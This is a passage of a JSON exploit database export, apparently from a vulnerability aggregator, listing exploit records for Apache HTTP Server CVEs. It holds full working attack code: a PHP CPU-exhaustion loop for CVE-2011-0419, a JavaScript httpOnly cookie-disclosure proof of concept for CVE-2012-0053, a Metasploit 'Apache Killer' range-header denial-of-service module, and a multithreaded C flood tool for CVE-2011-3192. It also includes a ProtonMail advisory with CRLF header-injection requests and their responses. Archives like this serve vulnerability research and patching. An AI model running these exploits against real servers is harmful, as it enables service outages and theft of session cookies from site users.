cx.............................................................................................................................\r\n-rw-r--r--  1 www   wheel  1240 Feb  8 19:42 run.php\r\n127# ps -aux -p 617 \r\nUSER PID %CPU %MEM   VSZ  RSS TTY STAT STARTED      TIME COMMAND\r\nwww  617 98.6  0.4 10028 4004 ?   R     7:38PM 121:43.17 /usr/pkg/sbin/httpd -k start \r\n\r\nTime = 121:43 and counting\r\n\r\nwhere http://[$localhost]:[$localport]/[$localuri]\r\n*/\r\n$localhost=\"localhost\";\r\n$localport=80;\r\n$localuri=\"/koniec/\";\r\n\r\n\r\nif(!is_writable(\".\")) die(\"!writable\");\r\n\r\n// Phase 1\r\n// Create some filename\r\ntouch(\"cx\".str_repeat(\".\",125));\r\n\r\n// Phase 2\r\n// Create .htaccess with \r\nunlink(\"./.htaccess\");\r\n$htaccess=fopen(\"./.htaccess\", \"a\");\r\nfwrite($htaccess,\"AddDescription \\\"CVE-2011-0419\\\" \".str_repeat('*.',512).\"\\n\");\r\nfclose($htaccess);\r\n\r\n// Phase 3\r\n// Local connect (bypass firewall restriction)\r\nwhile(1){\r\n\t$fp = fsockopen($localhost, $localport, $errno, $errstr, 30);\r\n\tif (!$fp) echo \"$errstr ($errno)<br />\\n\";\r\n\telse {\r\n\t\t$out = \"GET \".$localuri.\"/?P=\".str_repeat(\"*?\",1500).\"* HTTP/1.1\\r\\n\";\r\n\t\t$out .= \"Host: \".$localhost.\"\\r\\n\";\r\n\t\t$out .= \"Connection: Close\\r\\n\\r\\n\";\r\n\t\tfwrite($fp, $out);\r\n\t\tfclose($fp);\r\n\t}\r\n}\r\n\r\n?>\r\n\r\n\r\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:35738"
        }
    ],
    "CVE-2012-0053": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2012-02-01T00:00:00",
            "published": "2012-02-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-30056",
            "id": "SSV:30056",
            "type": "seebug",
            "title": "Apache httpOnly Cookie Disclosure(CVE-2012-0053)",
            "sourceData": "\n                                                // Source: https://gist.github.com/1955a1c28324d4724b7b/7fe51f2a66c1d4a40a736540b3ad3fde02b7fb08\r\n// Most browsers limit cookies to 4k characters, so we need multiple\r\nfunction setCookies (good) {\r\n    // Construct string for cookie value\r\n    var str = &quot;&quot;;\r\n    for (var i=0; i&lt; 819; i++) {\r\n        str += &quot;x&quot;;\r\n    }\r\n    // Set cookies\r\n    for (i = 0; i &lt; 10; i++) {\r\n        // Expire evil cookie\r\n        if (good) {\r\n            var cookie = &quot;xss&quot;+i+&quot;=;expires=&quot;+new Date(+new Date()-1).toUTCString()+&quot;; path=/;&quot;;\r\n        }\r\n        // Set evil cookie\r\n        else {\r\n            var cookie = &quot;xss&quot;+i+&quot;=&quot;+str+&quot;;path=/&quot;;\r\n        }\r\n        document.cookie = cookie;\r\n    }\r\n}\r\nfunction makeRequest() {\r\n    setCookies();\r\n    function parseCookies () {\r\n        var cookie_dict = {};\r\n        // Only react on 400 status\r\n        if (xhr.readyState === 4 &amp;&amp; xhr.status === 400) {\r\n            // Replace newlines and match &lt;pre&gt; content\r\n            var content = xhr.responseText.replace(/\\r|\\n/g,'').match(/&lt;pre&gt;(.+)&lt;\\/pre&gt;/);\r\n            if (content.length) {\r\n                // Remove Cookie: prefix\r\n                content = content[1].replace(&quot;Cookie: &quot;, &quot;&quot;);\r\n                var cookies = content.replace(/xss\\d=x+;?/g, '').split(/;/g);\r\n                // Add cookies to object\r\n                for (var i=0; i&lt;cookies.length; i++) {\r\n                    var s_c = cookies[i].split('=',2);\r\n                    cookie_dict[s_c[0]] = s_c[1];\r\n                }\r\n            }\r\n            // Unset malicious cookies\r\n            setCookies(true);\r\n            alert(JSON.stringify(cookie_dict));\r\n        }\r\n    }\r\n    // Make XHR request\r\n    var xhr = new XMLHttpRequest();\r\n    xhr.onreadystatechange = parseCookies;\r\n    xhr.open(&quot;GET&quot;, &quot;/&quot;, true);\r\n    xhr.send(null);\r\n}\r\nmakeRequest();\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:30056"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2012-01-31T00:00:00",
            "published": "2012-01-31T00:00:00",
            "href": "https://packetstormsecurity.com/files/109284/Apache-protocol.c-Cookie-Disclosure.html",
            "id": "PACKETSTORM:109284",
            "type": "packetstorm",
            "title": "Apache protocol.c Cookie Disclosure",
            "sourceData": "`// Source: https://gist.github.com/1955a1c28324d4724b7b/7fe51f2a66c1d4a40a736540b3ad3fde02b7fb08  \n// Most browsers limit cookies to 4k characters, so we need multiple  \nfunction setCookies (good) {  \n// Construct string for cookie value  \nvar str = \"\";  \nfor (var i=0; i< 819; i++) {  \nstr += \"x\";  \n}  \n// Set cookies  \nfor (i = 0; i < 10; i++) {  \n// Expire evil cookie  \nif (good) {  \nvar cookie = \"xss\"+i+\"=;expires=\"+new Date(+new Date()-1).toUTCString()+\"; path=/;\";  \n}  \n// Set evil cookie  \nelse {  \nvar cookie = \"xss\"+i+\"=\"+str+\";path=/\";  \n}  \ndocument.cookie = cookie;  \n}  \n}  \nfunction makeRequest() {  \nsetCookies();  \nfunction parseCookies () {  \nvar cookie_dict = {};  \n// Only react on 400 status  \nif (xhr.readyState === 4 && xhr.status === 400) {  \n// Replace newlines and match <pre> content  \nvar content = xhr.responseText.replace(/\\r|\\n/g,'').match(/<pre>(.+)<\\/pre>/);  \nif (content.length) {  \n// Remove Cookie: prefix  \ncontent = content[1].replace(\"Cookie: \", \"\");  \nvar cookies = content.replace(/xss\\d=x+;?/g, '').split(/;/g);  \n// Add cookies to object  \nfor (var i=0; i<cookies.length; i++) {  \nvar s_c = cookies[i].split('=',2);  \ncookie_dict[s_c[0]] = s_c[1];  \n}  \n}  \n// Unset malicious cookies  \nsetCookies(true);  \nalert(JSON.stringify(cookie_dict));  \n}  \n}  \n// Make XHR request  \nvar xhr = new XMLHttpRequest();  \nxhr.onreadystatechange = parseCookies;  \nxhr.open(\"GET\", \"/\", true);  \nxhr.send(null);  \n}  \nmakeRequest();  \n  \n  \n`\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:109284"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache httpOnly Cookie Disclosure. CVE-2012-0053. Remote exploits for multiple platform",
            "modified": "2012-01-31T00:00:00",
            "published": "2012-01-31T00:00:00",
            "id": "EDB-ID:18442",
            "href": "https://www.exploit-db.com/exploits/18442/",
            "type": "exploitdb",
            "title": "Apache httpOnly Cookie Disclosure",
            "sourceData": "// Source: https://gist.github.com/1955a1c28324d4724b7b/7fe51f2a66c1d4a40a736540b3ad3fde02b7fb08\r\n// Most browsers limit cookies to 4k characters, so we need multiple\r\nfunction setCookies (good) {\r\n    // Construct string for cookie value\r\n    var str = \"\";\r\n    for (var i=0; i< 819; i++) {\r\n        str += \"x\";\r\n    }\r\n    // Set cookies\r\n    for (i = 0; i < 10; i++) {\r\n        // Expire evil cookie\r\n        if (good) {\r\n            var cookie = \"xss\"+i+\"=;expires=\"+new Date(+new Date()-1).toUTCString()+\"; path=/;\";\r\n        }\r\n        // Set evil cookie\r\n        else {\r\n            var cookie = \"xss\"+i+\"=\"+str+\";path=/\";\r\n        }\r\n        document.cookie = cookie;\r\n    }\r\n}\r\n\r\nfunction makeRequest() {\r\n    setCookies();\r\n\r\n    function parseCookies () {\r\n        var cookie_dict = {};\r\n        // Only react on 400 status\r\n        if (xhr.readyState === 4 && xhr.status === 400) {\r\n            // Replace newlines and match <pre> content\r\n            var content = xhr.responseText.replace(/\\r|\\n/g,'').match(/<pre>(.+)<\\/pre>/);\r\n            if (content.length) {\r\n                // Remove Cookie: prefix\r\n                content = content[1].replace(\"Cookie: \", \"\");\r\n                var cookies = content.replace(/xss\\d=x+;?/g, '').split(/;/g);\r\n                // Add cookies to object\r\n                for (var i=0; i<cookies.length; i++) {\r\n                    var s_c = cookies[i].split('=',2);\r\n                    cookie_dict[s_c[0]] = s_c[1];\r\n                }\r\n            }\r\n            // Unset malicious cookies\r\n            setCookies(true);\r\n            alert(JSON.stringify(cookie_dict));\r\n        }\r\n    }\r\n    // Make XHR request\r\n    var xhr = new XMLHttpRequest();\r\n    xhr.onreadystatechange = parseCookies;\r\n    xhr.open(\"GET\", \"/\", true);\r\n    xhr.send(null);\r\n}\r\n\r\nmakeRequest();",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18442"
        }
    ],
    "CVE-2011-3192": [
        {
            "bulletinFamily": "exploit",
            "description": "The byterange filter in the Apache HTTP Server 2.0.x through 2.0.64, and 2.2.x through 2.2.19 allows remote attackers to cause a denial of service (memory and CPU consumption) via a Range header that expresses multiple overlapping ranges, exploit called \"Apache Killer\"\n",
            "modified": "2019-04-25T21:08:19",
            "published": "2011-09-23T16:38:35",
            "id": "MSF:AUXILIARY/DOS/HTTP/APACHE_RANGE_DOS",
            "href": "",
            "type": "metasploit",
            "title": "Apache Range Header DoS (Apache Killer)",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Range Header DoS (Apache Killer)',\n      'Description'    => %q{\n          The byterange filter in the Apache HTTP Server 2.0.x through 2.0.64, and 2.2.x\n        through 2.2.19 allows remote attackers to cause a denial of service (memory and\n        CPU consumption) via a Range header that expresses multiple overlapping ranges,\n        exploit called \"Apache Killer\"\n      },\n      'Author'         =>\n        [\n          'Kingcope', #original discoverer\n          'Masashi Fujiwara', #metasploit module\n          'Markus Neis <markus.neis[at]gmail.com>' # check for vulnerability\n        ],\n      'License'        => MSF_LICENSE,\n      'Actions'        =>\n        [\n          ['DOS'],\n          ['CHECK']\n        ],\n      'DefaultAction'  => 'DOS',\n      'References'     =>\n        [\n          [ 'BID', '49303'],\n          [ 'CVE', '2011-3192'],\n          [ 'EDB', '17696'],\n          [ 'OSVDB', '74721' ],\n        ],\n      'DisclosureDate' => 'Aug 19 2011'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('URI', [ true,  \"The request URI\", '/']),\n        OptInt.new('RLIMIT', [ true,  \"Number of requests to send\",50])\n      ])\n  end\n\n  def run_host(ip)\n\n    case action.name\n    when 'DOS'\n      conduct_dos()\n\n    when 'CHECK'\n      check_for_dos()\n    end\n\n  end\n\n  def check_for_dos()\n    uri = datastore['URI']\n    rhost = datastore['RHOST']\n    begin\n      res = send_request_cgi({\n        'uri'     =>  uri,\n        'method'  => 'HEAD',\n        'headers' => {\n          \"HOST\"  => rhost,\n          \"Range\" => \"bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10\",\n          \"Request-Range\" => \"bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10\"\n        }\n      })\n\n      if (res and res.code == 206)\n        print_status(\"Response was #{res.code}\")\n        print_status(\"Found Byte-Range Header DOS at #{uri}\")\n\n        report_note(\n          :host   => rhost,\n          :port   => rport,\n          :type   => 'apache.killer',\n          :data   => \"Apache Byte-Range DOS at #{uri}\"\n        )\n\n      else\n        print_status(\"#{rhost} doesn't seem to be vulnerable at #{uri}\")\n      end\n\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\n\n\n  def conduct_dos()\n    uri = datastore['URI']\n    rhost = datastore['RHOST']\n    ranges = ''\n    for i in (0..1299) do\n      ranges += \",5-\" + i.to_s\n    end\n    for x in 1..datastore['RLIMIT']\n      begin\n        print_status(\"Sending DoS packet #{x} to #{rhost}:#{rport}\")\n        res = send_request_cgi({\n          'uri'     =>  uri,\n          'method'  => 'HEAD',\n          'headers' => {\n            \"HOST\"  => rhost,\n            \"Range\" => \"bytes=0-#{ranges}\",\n            \"Request-Range\" => \"bytes=0-#{ranges}\"}},1)\n\n      rescue ::Rex::ConnectionRefused\n        print_error(\"Unable to connect to #{rhost}:#{rport}\")\n      rescue ::Errno::ECONNRESET\n        print_good(\"DoS packet successful. #{rhost} not responding.\")\n      rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n        print_error(\"Couldn't connect to #{rhost}:#{rport}\")\n      rescue ::Timeout::Error, ::Errno::EPIPE\n      end\n    end\n  end\nend\n",
            "cvss": {
                "score": 7.8,
                "vector": "AV:N/AC:L/Au:N/C:N/I:N/A:C"
            },
            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/DOS/HTTP/APACHE_RANGE_DOS"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-72403",
            "id": "SSV:72403",
            "title": "Apache HTTP Server Denial of Service",
            "type": "seebug",
            "sourceData": "\n                                                /*\r\n * This is a reverse engineered version of the exploit for CVE-2011-3192 made\r\n * by ev1lut10n (http://jayakonstruksi.com/backupintsec/rapache.tgz).\r\n * Copyright 2011 Ramon de C Valle &#60;rcvalle@redhat.com&#62;\r\n *\r\n * Compile with the following command:\r\n * gcc -Wall -pthread -o rcvalle-rapache rcvalle-rapache.c\r\n */\r\n\r\n#include &#60;stdio.h&#62;\r\n#include &#60;stdlib.h&#62;\r\n#include &#60;string.h&#62;\r\n#include &#60;sys/ptrace.h&#62;\r\n#include &#60;sys/types.h&#62;\r\n#include &#60;sys/socket.h&#62;\r\n#include &#60;netdb.h&#62;\r\n#include &#60;unistd.h&#62;\r\n#include &#60;pthread.h&#62;\r\n\r\nvoid ptrace_trap(void) __attribute__ ((constructor));\r\n\r\nvoid\r\nptrace_trap(void) {\r\n    if (ptrace(PTRACE_TRACEME, 0, 0, 0) &#60; 0) {\r\n        write(fileno(stdout), &#34;Segmentation fault\\n&#34;, 19);\r\n        exit(-1);\r\n    }\r\n}\r\n\r\nvoid\r\nw4rn41dun14mu(int attr, int fg, int bg)\r\n{\r\n    char command[13];\r\n\r\n    sprintf(command, &#34;%c[%d;%d;%dm&#34;, 0x1b, attr, fg+30, bg+40);\r\n    printf(&#34;%s&#34;, command);\r\n}\r\n\r\nvoid\r\nbanner()\r\n{\r\n    w4rn41dun14mu(0, 1, 0);\r\n    fwrite(&#34;Remote Apache Denial of Service Exploit by ev1lut10n\\n&#34;, 53, 1,\r\n           stdout);\r\n}\r\n\r\nvoid\r\ngime_er_mas()\r\n{\r\n    printf(&#34;%c%s&#34;, 0x1b, &#34;[2J&#34;);\r\n    printf(&#34;%c%s&#34;, 0x1b, &#34;[1;1H&#34;);\r\n    puts(&#34;\\nsorry dude there&#39;s an error...&#34;);\r\n}\r\n\r\nstruct thread_info {\r\n    pthread_t thread_id;\r\n    int       thread_num;\r\n    char     *argv_string;\r\n};\r\n\r\nstatic void *\r\nthread_start(void *arg)\r\n{\r\n    struct thread_info *tinfo = (struct thread_info *) arg;\r\n    char hostname[64];\r\n    int j;\r\n\r\n    strcpy(hostname, tinfo-&#62;argv_string);\r\n\r\n    j = 0;\r\n    while (j != 10) {\r\n        struct addrinfo hints;\r\n        struct addrinfo *result, *rp;\r\n        int sfd, s;\r\n        ssize_t nwritten;\r\n\r\n        memset(&hints, 0, sizeof(struct addrinfo));\r\n        hints.ai_family = AF_UNSPEC;\r\n        hints.ai_socktype = SOCK_STREAM;\r\n        hints.ai_flags = 0;\r\n        hints.ai_protocol = 0;\r\n\r\n        s = getaddrinfo(hostname, &#34;http&#34;, &hints, &result);\r\n        if (s != 0) {\r\n            fprintf(stderr, &#34;getaddrinfo: %s\\n&#34;, gai_strerror(s));\r\n            exit(EXIT_FAILURE);\r\n        }\r\n\r\n        for (rp = result; rp != NULL; rp = rp-&#62;ai_next) {\r\n            sfd = socket(rp-&#62;ai_family, rp-&#62;ai_socktype, rp-&#62;ai_protocol);\r\n            if (sfd == -1)\r\n                continue;\r\n\r\n            if (connect(sfd, rp-&#62;ai_addr, rp-&#62;ai_addrlen) == -1)\r\n                close(sfd);\r\n        }\r\n\r\n        if (result != NULL)\r\n            freeaddrinfo(result);\r\n\r\n        nwritten = write(sfd, &#34;HEAD / HTTP/1.1\\n&#34;\r\n                              &#34;Host:localhost\\n&#34;\r\n                              &#34;Range:bytes=0-,0-\\n&#34;\r\n                              &#34;Accept-Encoding: gzip&#34;, 71);\r\n        if (nwritten == -1)\r\n            close(sfd);\r\n\r\n        usleep(300000);\r\n\r\n        j++;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nint\r\nmain(int argc, char *argv[])\r\n{\r\n    int i;\r\n    struct thread_info tinfo;\r\n\r\n    banner();\r\n\r\n    if (argc &#60;= 1) {\r\n        w4rn41dun14mu(0, 2, 0);\r\n        fwrite(&#34;\\n[-] Usage : ./rapache hostname\\n&#34;, 32, 1, stdout);\r\n        return 0;\r\n    }\r\n\r\n    w4rn41dun14mu(0, 3, 0);\r\n    printf(&#34;[+] Attacking %s please wait  in minutes ...\\n&#34;, argv[1]);\r\n\r\n    while (1) {\r\n        i = 0;\r\n        while (i != 50) {\r\n            tinfo.thread_num = i;\r\n            tinfo.argv_string = argv[1];\r\n\r\n            pthread_create(&tinfo.thread_id, NULL, &thread_start, &tinfo);\r\n\r\n            usleep(500000);\r\n\r\n            i++;\r\n        }\r\n    }\r\n}\r\n\n                              ",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:72403"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2014-05-30T00:00:00",
            "published": "2014-05-30T00:00:00",
            "href": "https://packetstormsecurity.com/files/126851/ProtonMail.ch-Header-Injection-CSRF.html",
            "id": "PACKETSTORM:126851",
            "type": "packetstorm",
            "title": "ProtonMail.ch Header Injection / CSRF",
            "sourceData": "`SecurityAdvisory  \n----------------  \n  \n  \nTime Line Vulnerability  \n-------------------------------  \n  \n  \n-Day 05-05-2014 Security Advisory => No response  \n  \n  \n-Days 08 12 19-05-2014 Multiples Advisories => No Response  \n  \n  \n-Day 20-05-2014 Full Disclosure  \n  \n  \n  \nAlerts summary  \n********************  \n  \n  \n-CRLF injection/HTTP response splitting  \n  \n/crypt/cryptographp.php  \ncfg  \n  \n  \n-Apache 2.x version older than 2.2.6  \nWeb Server  \n  \n  \n-Apache 2.x version older than 2.2.8  \nWeb Server  \n  \n  \n-Apache 2.x version older than 2.2.9  \nWeb Server  \n  \n  \n-Apache httpd remote denial of service  \nWeb Server  \n  \n  \n-HTML form without CSRF protection  \n  \n/blog  \n/blog/transparency-report  \n/blog/wp-login.php  \n/blog/wp-login.php (cac6435f6386a7a635b3f12aeb81195e)  \n/crypt  \n/lander  \n/login.php  \n/report_bug.php  \n/sign_up.php  \n  \n  \n  \n-Apache 2.x version older than 2.2.10  \n  \nWeb Server  \n  \n  \n-Clickjacking: X-Frame-Options header missing  \n  \nWeb Server  \n  \n  \n-Sensitive page could be cached  \n  \n/sign_up.php (a18aae949b9855b60506dc83164afe7f)  \n  \n  \n  \n-Session Cookie without HttpOnly flag set  \n/  \n  \n  \n  \n-TRACE method is enabled  \n  \nWeb Server  \n  \n  \n  \n-Broken links  \n  \n/css/bootstrap.css  \n/css/bs.css  \n/pages/contact_us.php  \n/pages/mit_license.php  \nPassword type input with autocomplete enabled  \n/blog/wp-login.php  \n  \n  \n  \n  \nI. VULNERABILITY  \n-------------------------  \n  \n  \nThe ASAP-Sec Penetration Testers just explain faults exposed in the title  \n  \n  \n#Title: ProtonMail.ch suffers from a CRLF injection-HTTP response   \nsplitting / Apache 2.x version older than 2.2.6 -X.8 -X.9.- 2.2.10 /   \nhttpd RemoteDoS / CSRF  \n  \n  \n#Vendor:https://protonmail.ch:443/  \n  \n  \n#Author:Juan Carlos Garc\u00eda and Francisco Moraga  \n  \n  \n#Follow us : http://www.highsec.es ||| Twitter:@secnight / @btshell1  \n  \n  \n  \n  \n  \nII. DESCRIPTION  \n-------------------------  \n  \n  \n-ProtonMail is incorporated in Switzerland and their servers are located   \nin Switzerland.  \n  \n  \n-They are outside of US and EU jurisdiction and all user data is   \nprotected by strict Swiss privacy laws.  \n  \nBecause of our end-to-end encryption, They think that :  \n  \n\"Your data is already secure and encrypted by the time it reaches our   \nservers. We have no access to your messages, and since we cannot decrypt   \nthem, we cannot share them with third parties\".  \n  \n  \n-ProtonMail's segregated authentication and decryption system means   \nlogging into a ProtonMail account that requires two passwords.  \n  \n  \n-The first password is used to authenticate the user and retrieve the   \ncorrect account. After that, encrypted data is sent to the user.  \n  \n  \n-The second password is a decryption password which is never sent to us.   \nIt is used to decrypt the user\u0092s data in the browser so we never have   \naccess to the decrypted data  \n  \nor the decryption password.  \n  \n  \n-For this reason, we are also unable to do password recovery.  \n  \n  \n-If you forget your decryption password, we cannot recover your data.  \n  \n  \n  \n  \nBy theWay, ASAP-SEC are Verifiying this information... Let's go to the   \nbusiness ;)  \n  \n  \n  \n  \n  \nIII- Vulnerabilities  \n---------------------  \n  \n  \nCRLF injection / HTTP response splitting  \n****************************************  \n  \n  \nThis script is possibly vulnerable to CRLF injection attacks.  \n  \nHTTP headers have the structure \"Key:  \n  \nValue\", where each line is separated by the CRLF combination.  \n  \nIf the user input is injected into the value section without properly   \nescaping/removing  \n  \nCRLF characters it is possible to alter the HTTP headers structure.  \n  \nHTTP Response Splitting is a \"new\" application attack technique which   \nenables  \n  \nvarious new attacks such as web cache poisoning,cross user defacement,  \n  \nhijacking pages with sensitive user information and cross-site scripting   \n(XSS).  \n  \n  \nThe attacker sends a single HTTP request that forces the web server to   \nform an output stream,  \n  \nwhich is then interpreted by the target as two HTTP responses instead of   \none response.  \n  \n  \nAffected items  \n------------------  \n  \n/crypt/cryptographp.php  \n  \n  \n  \nThe impact of this vulnerability  \n----------------------------------  \n  \nIs it possible for a remote attacker to inject custom HTTP headers.  \n  \nFor example, an attacker can inject session cookies or HTML code.  \n  \nThis may conduct to vulnerabilities like XSS (cross-site scripting) or   \nsession fixation.  \n  \n  \n  \n  \nHow to fix this vulnerability  \n------------------------------------  \n  \n  \nYou need to restrict CR(0x13) and LF(0x10)  \n  \n  \nFrom  \n  \nthe user input  \n  \nor  \n  \nproperly encode the output  \n  \nin  \n  \norder to prevent the injection  \n  \nof  \n  \ncustom HTTP headers.  \n  \n  \n  \n  \nAttack details  \n--------------------  \n  \nURL encoded GET input cfg was set to   \n<SomeCustomInjectedHeader:injected_by_secnight  \n  \n  \n  \nInjected header found:  \n  \nSomeCustomInjectedHeader: injected_by_secnight  \n  \n  \n  \nGET   \n/crypt/cryptographp.php?cfg=%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_secnight  \n  \n  \n  \n  \n  \nHTTP/1.0 302 Found  \n  \nDate: Wed, 28 May 2014 15:33:55 GMT  \n  \nServer: Apache/2.2.3 (CentOS)  \n  \nX-Powered-By: PHP/5.3.28  \n  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \n  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0,   \npre-check=0  \n  \nPragma: no-cache  \n  \nSet-Cookie: cryptcookietest=1  \n  \nLocation: cryptographp.inc.php?cfg=  \n  \nSomeCustomInjectedHeader: injected_by_secnight&sn=PHPSESSID&  \n  \nStrict-Transport-Security: max-age=15768000;includeSubDomains  \n  \nContent-Length: 0  \n  \nConnection: close  \n  \nContent-Type: text/html  \n  \n  \n  \nHow to fix this vulnerability  \n-----------------------------  \n  \n  \nYou need to restrict CR(0x13) and LF(0x10) from the user  \n  \ninput or properly encode the output in order to prevent  \n  \nthe injection of custom HTTP headers.  \n  \n  \n  \n  \n  \nVariant 1  \n-----------  \n  \n  \nGET   \n/crypt/cryptographp.php?cfg=%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_asapsec   \nHTTP/1.1  \n  \nReferer: https://protonmail.ch:443/  \n  \nCookie: PHPSESSID=afaj9rt84m3oevgtld6thfe9l4; cryptcookietest=1  \n  \nHost: protonmail.ch  \n  \nConnection: Keep-alive  \n  \n  \nResponse  \n----------  \n  \n  \nHTTP/1.0 302 Found  \n  \nDate: Wed, 28 May 2014 15:33:55 GMT  \n  \nServer: Apache/2.2.3 (CentOS)  \n  \nX-Powered-By: PHP/5.3.28  \n  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \n  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0,   \npre-check=0  \n  \nPragma: no-cache  \n  \nSet-Cookie: cryptcookietest=1  \n  \nLocation: cryptographp.inc.php?cfg=  \n  \nSomeCustomInjectedHeader: injected_by_wvs&sn=PHPSESSID&  \n  \nStrict-Transport-Security: max-age=15768000;includeSubDomains  \n  \nContent-Length: 0  \n  \nConnection: close  \n  \nContent-Type: text/html  \n  \n  \n  \n  \n  \n  \nApache 2.x version older than 2.2.10  \n**************************************  \n  \n  \nFixed in Apache httpd 2.2.10: mod_proxy_ftp globbing XSS CVE-2008-2939  \n  \nA flaw was found in the handling of wildcards in the path of a FTP URL   \nwith mod_proxy_ftp.  \n  \nIf mod_proxy_ftp is enabled to support FTP-over-HTTP, requests   \ncontaining globbing characters could lead to cross-site scripting (XSS)   \nattacks.  \n  \nAffected Apache versions (2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3,   \n2.2.2, 2.2.0).  \n  \n  \n  \n  \nApache httpd remote denial of service  \n*************************************  \n  \n  \nVulnerability description  \n------------------------------  \n  \n  \nA denial of service vulnerability has been found in the way the multiple  \n  \noverlapping ranges are handled by the Apache HTTPD server:  \n  \n  \n  \n  \nhttp://seclists.org/fulldisclosure/2011/Aug/175  \n  \n  \n  \nAn attack tool is circulating in the wild. Active use of this tools has   \nbeen observed. The attack can be done remotely  \n  \nand with a modest number of requests can cause very significant memory   \nand CPU usage on the server.  \n  \n  \nAffected Apache versions (1.3.x, 2.0.x through 2.0.64, and 2.2.x through   \n2.2.19).  \n  \n  \n  \nHow to fix this vulnerability  \n-----------------------------  \nUpgrade to the latest version of Apache HTTP Server (2.2.20 or later),   \navailable from the Apache HTTP Server Project Web site.  \n  \n  \n  \n  \n  \nWeb references  \n--------------  \nCVE-2011-3192  \n  \n  \n  \n  \n  \n  \n  \n  \nSensitive page could be cached  \n******************************  \n  \n  \nVulnerability description  \n-----------------------  \n  \n  \nThis page contains possible sensitive information (e.g. a password   \nparameter)  \n  \nand could be potentially cached. Even in secure SSL channels sensitive   \ndata could  \n  \nbe stored by intermediary proxies and SSL terminators. To prevent this,   \na Cache-Control header should be specified.  \n  \nThis vulnerability affects  \n  \n  \n/sign_up.php (a18aae949b9855b60506dc83164afe7f).  \n  \n  \nGET /sign_up.php?username=urvimsoj HTTP/1.1  \n  \nPragma: no-cache  \n  \nReferer: https://protonmail.ch/lander/  \n  \n  \nResponse  \n----------  \n  \nHTTP/1.0 200 OK  \n  \nDate: Sun, 18 May 2014 19:27:10 GMT  \n  \nServer: Apache/2.2.3 (CentOS)  \n  \nX-Powered-By: PHP/5.3.28  \n  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \n  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0,   \npre-check=0  \n  \nPragma: no-cache  \n  \nStrict-Transport-Security: max-age=15768000;includeSubDomains  \n  \nConnection: close  \n  \nContent-Type: text/html  \n  \nContent-Length: 8285  \n  \n  \n  \n  \nHTML form without CSRF protection  \n********************************  \n  \n  \nVulnerability description  \n------------------------------  \n  \n  \nCross-site request forgery, also known as a one-click attack or session   \nriding  \nand abbreviated as CSRF or XSRF, is a type of malicious exploit of a   \nwebsite  \nwhereby unauthorized commands are transmitted from a user that the   \nwebsite trusts.  \n  \nPenetration Tester (Authors) found a HTML form with no apparent CSRF   \nprotection implemented. Consult details for more information about the   \naffected HTML form.  \n  \n  \nAffected items  \n---------------  \n  \n/blog  \n/blog/transparency-report  \n/blog/wp-login.php  \n/blog/wp-login.php (cac6435f6386a7a635b3f12aeb81195e)  \n/crypt  \n/lander  \n/login.php  \n/report_bug.php  \n/sign_up.php  \n  \n  \n  \nThe impact of this vulnerability  \n--------------------------------  \n  \n  \nAn attacker may force the users of a web application to execute actions   \nof the attacker's choosing.  \n  \nA successful CSRF exploit can compromise end user data and operation in   \ncase of normal user.  \n  \nIf the targeted end user is the administrator account, this can   \ncompromise the entire web application.  \n  \n  \n  \n  \nHow to fix this vulnerability  \n-----------------------------  \n  \n  \nCheck if this form requires CSRF protection and implement CSRF   \ncountermeasures if necessary.  \n  \n  \n  \nCREDITS  \n-------------------------  \n  \nThis vulnerability has been discovered  \n  \nby Juan Carlos Garc\u00eda(@secnight)  \n  \nand  \n  \nFrancisco Moraga (@btshell)  \n  \n  \n  \n  \nVII. LEGAL NOTICES  \n-------------------------  \n  \nThe Authors accepts no responsibility for any damage  \ncaused by the use or misuse of this 